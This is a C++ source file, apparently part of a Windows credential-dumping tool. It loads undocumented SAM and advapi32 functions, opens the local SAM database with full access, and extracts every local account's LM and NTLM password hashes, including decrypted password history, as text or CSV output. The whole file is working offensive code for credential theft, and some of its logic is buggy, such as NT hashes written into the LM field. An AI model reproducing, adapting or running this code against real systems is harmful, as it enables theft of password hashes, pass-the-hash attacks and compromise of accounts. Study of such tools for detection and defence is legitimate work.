#include "sam.h"

typedef NTSTATUS(WINAPI* PSYSTEM_FUNCTION_025) (BYTE[16], DWORD*, BYTE[16]);
typedef NTSTATUS(WINAPI* PSYSTEM_FUNCTION_027) (BYTE[16], DWORD*, BYTE[16]);

PSAM_I_CONNECT SamIConnect = reinterpret_cast<PSAM_I_CONNECT>(NULL);
PSAM_R_OPEN_DOMAIN SamrOpenDomain = reinterpret_cast<PSAM_R_OPEN_DOMAIN>(NULL);
PSAM_R_OPEN_USER SamrOpenUser = reinterpret_cast<PSAM_R_OPEN_USER>(NULL);
PSAM_R_ENUMERATE_USERS_IN_DOMAIN SamrEnumerateUsersInDomain = reinterpret_cast<PSAM_R_ENUMERATE_USERS_IN_DOMAIN>(NULL);
PSAM_R_QUERY_INFORMATION_USER SamrQueryInformationUser = reinterpret_cast<PSAM_R_QUERY_INFORMATION_USER>(NULL);
PSAM_I_FREE_SAMPR_USER_INFO_BUFFER SamIFree_SAMPR_USER_INFO_BUFFER = reinterpret_cast<PSAM_I_FREE_SAMPR_USER_INFO_BUFFER>(NULL);
PSAM_I_FREE_SAMPR_ENUMERATION_BUFFER SamIFree_SAMPR_ENUMERATION_BUFFER = reinterpret_cast<PSAM_I_FREE_SAMPR_ENUMERATION_BUFFER>(NULL);
PSAM_I_FREE_MEMORY SamFreeMemory = reinterpret_cast<PSAM_I_FREE_MEMORY>(NULL);
PSAM_R_CLOSE_HANDLE SamrCloseHandle = reinterpret_cast<PSAM_R_CLOSE_HANDLE>(NULL);
PSAM_I_GET_PRIVATE_DATA SamIGetPrivateData = reinterpret_cast<PSAM_I_GET_PRIVATE_DATA>(NULL);
PSYSTEM_FUNCTION_025 SystemFunction025 = reinterpret_cast<PSYSTEM_FUNCTION_025>(NULL);
PSYSTEM_FUNCTION_027 SystemFunction027 = reinterpret_cast<PSYSTEM_FUNCTION_027>(NULL);

bool searchSAMFuncs()
{
	if (!(SamIConnect &&
		SamrOpenDomain &&
		SamrOpenUser &&
		SamrEnumerateUsersInDomain &&
		SamrQueryInformationUser &&
		SamIFree_SAMPR_USER_INFO_BUFFER &&
		SamIFree_SAMPR_ENUMERATION_BUFFER &&
		SamrCloseHandle &&
		SamIGetPrivateData &&
		SystemFunction025 &&
		SystemFunction027))
	{
		HMODULE hSamsrv = LoadLibrary(L"samlib.dll");
		HMODULE hAdvapi32 = GetModuleHandle(L"advapi32.dll");

		if (hSamsrv && hAdvapi32)
		{
			SamIConnect = reinterpret_cast<PSAM_I_CONNECT>(GetProcAddress(hSamsrv, "SamConnect"));
			SamrOpenDomain = reinterpret_cast<PSAM_R_OPEN_DOMAIN>(GetProcAddress(hSamsrv, "SamOpenDomain"));
			SamrOpenUser = reinterpret_cast<PSAM_R_OPEN_USER>(GetProcAddress(hSamsrv, "SamOpenUser"));
			SamrEnumerateUsersInDomain = reinterpret_cast<PSAM_R_ENUMERATE_USERS_IN_DOMAIN>(GetProcAddress(hSamsrv, "SamEnumerateUsersInDomain"));
			SamrQueryInformationUser = reinterpret_cast<PSAM_R_QUERY_INFORMATION_USER>(GetProcAddress(hSamsrv, "SamQueryInformationUser"));
			SamIFree_SAMPR_USER_INFO_BUFFER = reinterpret_cast<PSAM_I_FREE_SAMPR_USER_INFO_BUFFER>(GetProcAddress(hSamsrv, "SamIFree_SAMPR_USER_INFO_BUFFER"));
			SamIFree_SAMPR_ENUMERATION_BUFFER = reinterpret_cast<PSAM_I_FREE_SAMPR_ENUMERATION_BUFFER>(GetProcAddress(hSamsrv, "SamIFree_SAMPR_ENUMERATION_BUFFER"));
			SamFreeMemory = reinterpret_cast<PSAM_I_FREE_SAMPR_ENUMERATION_BUFFER>(GetProcAddress(hSamsrv, "SamIFree_SAMPR_ENUMERATION_BUFFER"));
			SamrCloseHandle = reinterpret_cast<PSAM_R_CLOSE_HANDLE>(GetProcAddress(hSamsrv, "SamrCloseHandle"));
			SamIGetPrivateData = reinterpret_cast<PSAM_I_GET_PRIVATE_DATA>(GetProcAddress(hSamsrv, "SamIGetPrivateData"));
			SystemFunction025 = reinterpret_cast<PSYSTEM_FUNCTION_025>(GetProcAddress(hAdvapi32, "SystemFunction025"));
			SystemFunction027 = reinterpret_cast<PSYSTEM_FUNCTION_027>(GetProcAddress(hAdvapi32, "SystemFunction027"));
		}
		return (SamIConnect &&
			SamrOpenDomain &&
			SamrOpenUser &&
			SamrEnumerateUsersInDomain &&
			SamrQueryInformationUser &&
			SamIFree_SAMPR_USER_INFO_BUFFER &&
			SamIFree_SAMPR_ENUMERATION_BUFFER &&
			SamrCloseHandle);
	}
	else return true;
}

__kextdll bool __cdecl getSAMFunctions()
{
	wostringstream monStream;
	monStream << L"** samsrv.dll/advapi32.dll ** ; Status research : " << (searchSAMFuncs() ? L"OK :)" : L"KO :(") << endl << endl <<
		L"@SamIConnect                       = " << SamIConnect << endl <<
		L"@SamrOpenDomain                    = " << SamrOpenDomain << endl <<
		L"@SamrOpenUser                      = " << SamrOpenUser << endl <<
		L"@SamrEnumerateUsersInDomain        = " << SamrEnumerateUsersInDomain << endl <<
		L"@SamrQueryInformationUser          = " << SamrQueryInformationUser << endl <<
		L"@SamIFree_SAMPR_USER_INFO_BUFFER   = " << SamIFree_SAMPR_USER_INFO_BUFFER << endl <<
		L"@SamIFree_SAMPR_ENUMERATION_BUFFER = " << SamIFree_SAMPR_ENUMERATION_BUFFER << endl <<
		L"@SamrCloseHandle                   = " << SamrCloseHandle << endl <<
		L"@SamIGetPrivateData                = " << SamIGetPrivateData << endl <<
		L"@SystemFunction025                 = " << SystemFunction025 << endl <<
		L"@SystemFunction027                 = " << SystemFunction027 << endl;


	return true;
}

__kextdll bool __cdecl getLocalAccounts()
{
	if (searchSAMFuncs())
	{
		bool sendOk = true, history = true, isCSV = false;
		USER_INFORMATION_CLASS monType = UserInternal1Information;

		LSA_HANDLE handlePolicy = NULL;
		HSAM handleSam = NULL;
		HDOMAIN handleDomain = NULL;
		HUSER handleUser = NULL;

		LSA_OBJECT_ATTRIBUTES objectAttributes;
		memset(&objectAttributes, NULL, sizeof(objectAttributes));
		PPOLICY_ACCOUNT_DOMAIN_INFO ptrPolicyDomainInfo;

		NTSTATUS retourEnum = 0;
		PSAMPR_ENUMERATION_BUFFER ptrStructEnumUser = NULL;
		DWORD EnumerationContext = 0;
		DWORD EnumerationSize = 0;

		PSAMPR_USER_INFO_BUFFER ptrMesInfosUsers = NULL;

		if (NT_SUCCESS(LsaOpenPolicy(NULL, &objectAttributes, POLICY_ALL_ACCESS, &handlePolicy)))
		{
			if (NT_SUCCESS(LsaQueryInformationPolicy(handlePolicy, PolicyAccountDomainInformation, reinterpret_cast<PVOID*>(&ptrPolicyDomainInfo))))
			{
				if (NT_SUCCESS(SamIConnect(NULL, &handleSam, 1, SAM_SERVER_CONNECT)))
				{
					if (NT_SUCCESS(SamrOpenDomain(handleSam, DOMAIN_ALL_ACCESS, ptrPolicyDomainInfo->DomainSid, &handleDomain)))
					{
						wstring domainName = mod_text::stringOfSTRING(ptrPolicyDomainInfo->DomainName);
						do
						{
							retourEnum = SamrEnumerateUsersInDomain(handleDomain, &EnumerationContext, NULL, &ptrStructEnumUser, 1000, &EnumerationSize);
							if (NT_SUCCESS(retourEnum) || retourEnum == STATUS_MORE_ENTRIES)
							{
								for (DWORD numUser = 0; numUser < ptrStructEnumUser->EntriesRead && sendOk; numUser++)
								{
									wstring monUserName = mod_text::stringOfSTRING(ptrStructEnumUser->Buffer[numUser].Name);
									ptrMesInfosUsers = NULL;

									if (NT_SUCCESS(SamrOpenUser(handleDomain, USER_ALL_ACCESS, ptrStructEnumUser->Buffer[numUser].RelativeId, &handleUser)))
									{
										if (NT_SUCCESS(SamrQueryInformationUser(handleUser, monType, &ptrMesInfosUsers)))
										{
											WUserAllInformation mesInfos = UserInformationsToStruct(monType, ptrMesInfosUsers);
											mesInfos.UserId = ptrStructEnumUser->Buffer[numUser].RelativeId;
											mesInfos.DomaineName = mod_text::stringOfSTRING(ptrPolicyDomainInfo->DomainName);

											if (mesInfos.UserName.empty())
												mesInfos.UserName = mod_text::stringOfSTRING(ptrStructEnumUser->Buffer[numUser].Name);

											sendOk = descrToPipeInformations(monType, mesInfos, isCSV);
											SamIFree_SAMPR_USER_INFO_BUFFER(ptrMesInfosUsers, monType);
										}

										if (history && SamIGetPrivateData != NULL)
										{
											sendOk = descrUserHistoryToPipe(ptrStructEnumUser->Buffer[numUser].RelativeId, monUserName, domainName, handleUser, monType, isCSV);
										}
										SamrCloseHandle(reinterpret_cast<PHANDLE>(&handleUser));
									}
									else printf("Unable to open the user object\n");
								}
								SamIFree_SAMPR_ENUMERATION_BUFFER(ptrStructEnumUser);
							}
							else printf("Failure in obtaining the object list\n");

						} while (retourEnum == STATUS_MORE_ENTRIES && sendOk);
						SamrCloseHandle(reinterpret_cast<PHANDLE>(&handleDomain));
					}
					else printf("Unable to get information about the domain\n");
					SamrCloseHandle(reinterpret_cast<PHANDLE>(&handleSam));
				}
				else printf("Impossible de se connecter �� la base de s��curit�� du domaine\n");
				LsaFreeMemory(ptrPolicyDomainInfo);
			}
			else printf("Unable to get information about the security policy\n");
			LsaClose(handlePolicy);
		}
		else printf("Unable to open security policy\n");

		return sendOk;
	}
	else return getSAMFunctions();
}

bool descrToPipeInformations(USER_INFORMATION_CLASS type, WUserAllInformation& mesInfos, bool isCSV)
{
	wstringstream maReponse;

	switch (type)
	{
	case UserInternal1Information:
		if (isCSV)
		{
			maReponse <<
				mesInfos.UserId << L";" <<
				mesInfos.UserName << L";" <<
				mesInfos.DomaineName << L";" <<
				mesInfos.LmOwfPassword << L";" <<
				mesInfos.NtOwfPassword << L";"
				;
		}
		else
		{
			maReponse <<
				L"ID                      : " << mesInfos.UserId << endl <<
				L"Name                    : " << mesInfos.UserName << endl <<
				L"Domain                  : " << mesInfos.DomaineName << endl <<
				L"LM Hash                 : " << mesInfos.LmOwfPassword << endl <<
				L"NTLM Hash               : " << mesInfos.NtOwfPassword << endl
				;
		}
		break;
	case UserAllInformation:
		if (isCSV)
		{
			maReponse <<
				mesInfos.UserId << L';' <<
				mesInfos.UserName << L';' <<
				mesInfos.DomaineName << L';' <<
				protectMe(mesInfos.FullName) << L';' <<
				mesInfos.isActif << L';' <<
				mesInfos.isLocked << L';' <<
				mesInfos.TypeCompte << L';' <<
				protectMe(mesInfos.UserComment) << L';' <<
				protectMe(mesInfos.AdminComment) << L';' <<
				mesInfos.AccountExpires_strict << L';' <<
				protectMe(mesInfos.WorkStations) << L';' <<
				protectMe(mesInfos.HomeDirectory) << L';' <<
				protectMe(mesInfos.HomeDirectoryDrive) << L';' <<
				protectMe(mesInfos.ProfilePath) << L';' <<
				protectMe(mesInfos.ScriptPath) << L';' <<
				mesInfos.LogonCount << L';' <<
				mesInfos.BadPasswordCount << L';' <<
				mesInfos.LastLogon_strict << L';' <<
				mesInfos.LastLogoff_strict << L';' <<
				mesInfos.PasswordLastSet_strict << L';' <<
				mesInfos.isPasswordNotExpire << L';' <<
				mesInfos.isPasswordNotRequired << L';' <<
				mesInfos.isPasswordExpired << L';' <<
				mesInfos.PasswordCanChange_strict << L';' <<
				mesInfos.PasswordMustChange_strict << L';' <<
				mesInfos.LmOwfPassword << L';' <<
				mesInfos.NtOwfPassword << L';'
				;
		}
		else
		{
			maReponse << boolalpha <<
				L"Account" << endl <<
				L"======" << endl <<
				L"ID                      : " << mesInfos.UserId << endl <<
				L"Name                    : " << mesInfos.UserName << endl <<
				L"Domain                  : " << mesInfos.DomaineName << endl <<
				L"Full Name               : " << mesInfos.FullName << endl <<
				L"Actif                   : " << mesInfos.isActif << endl <<
				L"Locked                  : " << mesInfos.isLocked << endl <<
				L"Type                    : " << mesInfos.TypeCompte << endl <<
				L"User Comment            : " << mesInfos.UserComment << endl <<
				L"Admin Comment           : " << mesInfos.AdminComment << endl <<
				L"Expiration              : " << mesInfos.AccountExpires << endl <<
				L"Station(s)              : " << mesInfos.WorkStations << endl <<
				endl <<
				L"Path" << endl <<
				L"-------" << endl <<
				L"Home Directory          : " << mesInfos.HomeDirectory << endl <<
				L"Homedir path         : " << mesInfos.HomeDirectoryDrive << endl <<
				L"Profile path                  : " << mesInfos.ProfilePath << endl <<
				L"Script path     : " << mesInfos.ScriptPath << endl <<
				endl <<
				L"Connetions" << endl <<
				L"----------" << endl <<
				L"Number                  : " << mesInfos.LogonCount << endl <<
				L"Failures                : " << mesInfos.BadPasswordCount << endl <<
				L"Last logon              : " << mesInfos.LastLogon << endl <<
				L"Last logoff             : " << mesInfos.LastLogoff << endl <<
				endl <<
				L"Password" << endl <<
				L"------------" << endl <<
				L"Pass last set           : " << mesInfos.PasswordLastSet << endl <<
				L"Pass doesn't expire     : " << mesInfos.isPasswordNotExpire << endl <<
				L"Pass not required       : " << mesInfos.isPasswordNotRequired << endl <<
				L"Pass expired            : " << mesInfos.isPasswordExpired << endl <<
				L"Pass can change         : " << mesInfos.PasswordCanChange << endl <<
				L"Pass MUST change        : " << mesInfos.PasswordMustChange << endl <<
				endl <<
				L"Hashes" << endl <<
				L"-----" << endl <<
				L"LM Hash                 : " << mesInfos.LmOwfPassword << endl <<
				L"NTLM Hash               : " << mesInfos.NtOwfPassword << endl <<
				endl
				;
		}
		break;
	}

	maReponse << endl;
	return true;
}

WUserAllInformation UserInformationsToStruct(USER_INFORMATION_CLASS type, PSAMPR_USER_INFO_BUFFER& monPtr)
{
	WUserAllInformation mesInfos;
	PSAMPR_USER_INTERNAL1_INFORMATION ptrPassword = NULL;
	PSAMPR_USER_ALL_INFORMATION ptrAllInformations = NULL;

	switch (type)
	{
	case UserInternal1Information:
		ptrPassword = reinterpret_cast<PSAMPR_USER_INTERNAL1_INFORMATION>(monPtr);

		mesInfos.LmPasswordPresent = ptrPassword->LmPasswordPresent != 0;
		mesInfos.NtPasswordPresent = ptrPassword->NtPasswordPresent != 0;

		if (mesInfos.LmPasswordPresent)
			mesInfos.LmOwfPassword = mod_text::stringOfHex(ptrPassword->EncryptedLmOwfPassword.data, sizeof(ptrPassword->EncryptedLmOwfPassword.data));
		if (mesInfos.NtPasswordPresent)
			mesInfos.LmOwfPassword = mod_text::stringOfHex(ptrPassword->EncryptedNtOwfPassword.data, sizeof(ptrPassword->EncryptedNtOwfPassword.data));
		break;

	case UserAllInformation:
		ptrAllInformations = reinterpret_cast<PSAMPR_USER_ALL_INFORMATION>(monPtr);

		mesInfos.UserId = ptrAllInformations->UserId;
		mesInfos.UserName = mod_text::stringOfSTRING(ptrAllInformations->UserName);
		mesInfos.FullName = mod_text::stringOfSTRING(ptrAllInformations->FullName); correctMe(mesInfos.FullName);

		mesInfos.isActif = (ptrAllInformations->UserAccountControl & USER_ACCOUNT_DISABLED) == 0;
		mesInfos.isLocked = (ptrAllInformations->UserAccountControl & USER_ACCOUNT_AUTO_LOCKED) != 0;

		if (ptrAllInformations->UserAccountControl & USER_SERVER_TRUST_ACCOUNT)
			mesInfos.TypeCompte.assign(L"Domain Controller");
		else if (ptrAllInformations->UserAccountControl & USER_WORKSTATION_TRUST_ACCOUNT)
			mesInfos.TypeCompte.assign(L"Computer");
		else if (ptrAllInformations->UserAccountControl & USER_NORMAL_ACCOUNT)
			mesInfos.TypeCompte.assign(L"User");
		else
			mesInfos.TypeCompte.assign(L"Anonymous");

		mesInfos.UserComment = mod_text::stringOfSTRING(ptrAllInformations->UserComment); correctMe(mesInfos.AdminComment);
		mesInfos.AdminComment = mod_text::stringOfSTRING(ptrAllInformations->AdminComment); correctMe(mesInfos.AdminComment);
		mesInfos.AccountExpires = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->AccountExpires);
		mesInfos.AccountExpires_strict = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->AccountExpires, true);
		mesInfos.WorkStations = mod_text::stringOfSTRING(ptrAllInformations->WorkStations);
		mesInfos.HomeDirectory = mod_text::stringOfSTRING(ptrAllInformations->HomeDirectory); correctMe(mesInfos.HomeDirectory);
		mesInfos.HomeDirectoryDrive = mod_text::stringOfSTRING(ptrAllInformations->HomeDirectoryDrive); correctMe(mesInfos.HomeDirectoryDrive);
		mesInfos.ProfilePath = mod_text::stringOfSTRING(ptrAllInformations->ProfilePath); correctMe(mesInfos.ProfilePath);
		mesInfos.ScriptPath = mod_text::stringOfSTRING(ptrAllInformations->ScriptPath); correctMe(mesInfos.ScriptPath);
		mesInfos.LogonCount = ptrAllInformations->LogonCount;
		mesInfos.BadPasswordCount = ptrAllInformations->BadPasswordCount;
		mesInfos.LastLogon = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->LastLogon);
		mesInfos.LastLogon_strict = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->LastLogon, true);
		mesInfos.LastLogoff = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->LastLogoff);
		mesInfos.LastLogoff_strict = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->LastLogoff, true);
		mesInfos.PasswordLastSet = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->PasswordLastSet);
		mesInfos.PasswordLastSet_strict = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->PasswordLastSet, true);
		mesInfos.isPasswordNotExpire = (ptrAllInformations->UserAccountControl & USER_DONT_EXPIRE_PASSWORD) != 0;
		mesInfos.isPasswordNotRequired = (ptrAllInformations->UserAccountControl & USER_PASSWORD_NOT_REQUIRED) != 0;
		mesInfos.isPasswordExpired = ptrAllInformations->PasswordExpired != 0;
		mesInfos.PasswordCanChange = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->PasswordCanChange);
		mesInfos.PasswordCanChange_strict = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->PasswordCanChange, true);
		mesInfos.PasswordMustChange = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->PasswordMustChange);
		mesInfos.PasswordMustChange_strict = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->PasswordMustChange, true);
		mesInfos.LmPasswordPresent = ptrAllInformations->LmPasswordPresent != 0;
		mesInfos.NtPasswordPresent = ptrAllInformations->NtPasswordPresent != 0;

		if (mesInfos.LmPasswordPresent)
			mesInfos.LmOwfPassword = mod_text::stringOfHex(reinterpret_cast<BYTE*>(ptrAllInformations->LmOwfPassword.Buffer), ptrAllInformations->LmOwfPassword.Length);
		if (mesInfos.NtPasswordPresent)
			mesInfos.LmOwfPassword = mod_text::stringOfHex(reinterpret_cast<BYTE*>(ptrAllInformations->NtOwfPassword.Buffer), ptrAllInformations->NtOwfPassword.Length);

		break;
	}
	return mesInfos;
}

bool descrUserHistoryToPipe(DWORD rid, wstring monUserName, wstring domainName, HUSER handleUser, USER_INFORMATION_CLASS type, bool isCSV)
{
	WUserAllInformation mesInfos;
	mesInfos.DomaineName = domainName;
	mesInfos.UserId = rid;

	DWORD Context = 2, Type = 0, tailleBlob;
	PWHashHistory pMesDatas = NULL;
	bool sendOk = true;

	if (NT_SUCCESS(SamIGetPrivateData(handleUser, &Context, &Type, &tailleBlob, &pMesDatas)))
	{
		unsigned short nbEntrees = min(pMesDatas->histNTLMsize, pMesDatas->histLMsize) / 16;

		for (unsigned short i = 1; i < nbEntrees && sendOk; i++)
		{
			BYTE monBuff[16] = { 0 };

			wostringstream userNameQualif;
			userNameQualif << monUserName << L"{p-" << i << L"}";
			mesInfos.UserName = userNameQualif.str();

			if (NT_SUCCESS(SystemFunction025(pMesDatas->hashs[nbEntrees + i], &rid, monBuff)))
			{
				mesInfos.LmPasswordPresent = 1;
				mesInfos.LmOwfPassword = mod_text::stringOfHex(monBuff, 0x10);
			}
			else
			{
				mesInfos.LmPasswordPresent = 0;
				mesInfos.LmOwfPassword = L"Decoding failure :(";
			}

			if (NT_SUCCESS(SystemFunction027(pMesDatas->hashs[i], &rid, monBuff)))
			{
				mesInfos.NtPasswordPresent = 1;
				mesInfos.NtOwfPassword = mod_text::stringOfHex(monBuff, 0x10);
			}
			else
			{
				mesInfos.NtPasswordPresent = 0;
				mesInfos.NtOwfPassword = L"decoding failure :(";
			}

			sendOk = descrToPipeInformations(type, mesInfos, isCSV);
		}
		LocalFree(pMesDatas);
	}
	return sendOk;
}

wstring toTimeFromOLD_LARGE_INTEGER(OLD_LARGE_INTEGER& monInt, bool isStrict)
{
	wostringstream reponse;

	if (monInt.LowPart == ULONG_MAX && monInt.HighPart == LONG_MAX)
	{
		if (!isStrict)
			reponse << L"N\'ever happens";
	}
	else if (monInt.LowPart == 0 && monInt.HighPart == 0)
	{
		if (!isStrict)
			reponse << L"Has not yet arrived";
	}
	else
	{
		SYSTEMTIME monTimeStamp;
		if (FileTimeToSystemTime(reinterpret_cast<PFILETIME>(&monInt), &monTimeStamp) != FALSE)
		{
			reponse << dec <<
				setw(2) << setfill(wchar_t('0')) << monTimeStamp.wDay << L"/" <<
				setw(2) << setfill(wchar_t('0')) << monTimeStamp.wMonth << L"/" <<
				setw(4) << setfill(wchar_t('0')) << monTimeStamp.wYear << L" " <<
				setw(2) << setfill(wchar_t('0')) << monTimeStamp.wHour << L":" <<
				setw(2) << setfill(wchar_t('0')) << monTimeStamp.wMinute << L":" <<
				setw(2) << setfill(wchar_t('0')) << monTimeStamp.wSecond;
		}
	}
	return reponse.str();
}

wstring protectMe(wstring& maChaine)
{
	wstring result;
	if (!maChaine.empty())
	{
		result = L"\"";
		result.append(maChaine);
		result.append(L"\"");
	}
	return result;
}

void correctMe(wstring& maChaine)
{
	unsigned char source[] = { 0x19, 0x20, 0x13, 0x20, 0xab, 0x00, 0xbb, 0x00, 0x26, 0x20 };
	unsigned char replac[] = { '\'', 0   , '-' , 0   , '\"', 0   , '\"', 0,    '.',  0 };

	for (unsigned int i = 0; i < maChaine.size(); i++)
	{
		const BYTE* monPtr = reinterpret_cast<const BYTE*>(&maChaine.c_str()[i]);
		for (int j = 0; j < min(sizeof(source), sizeof(replac)); j += 2)
		{
			if (*monPtr == source[j] && *(monPtr + 1) == source[j + 1])
			{
				*const_cast<BYTE*>(monPtr) = replac[j];
				*const_cast<BYTE*>(monPtr + 1) = replac[j + 1];
				break;
			}
		}
	}
}